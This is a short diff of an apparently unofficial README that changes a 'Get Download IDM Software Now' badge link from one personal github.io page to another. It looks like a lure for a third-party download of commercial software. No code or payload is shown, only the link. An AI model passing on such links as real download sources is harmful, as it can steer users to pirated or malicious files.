@@ -4,7 +4,7 @@
 
 ![Banner Placeholder](https://5.imimg.com/data5/WU/JF/GO/SELLER-91636213/internet-download-manager-software.jpg)
 
-[![Get Download IDM Software Now](https://img.shields.io/badge/Get_Download_IDM_Software-Now-0a5d8d?style=for-the-badge&logo=github)](https://milerbadd.github.io/.github/idm-software)
+[![Get Download IDM Software Now](https://img.shields.io/badge/Get_Download_IDM_Software-Now-0a5d8d?style=for-the-badge&logo=github)](https://hudsonwallaceikqe.github.io/.github/idm-software)
 
 ---
 
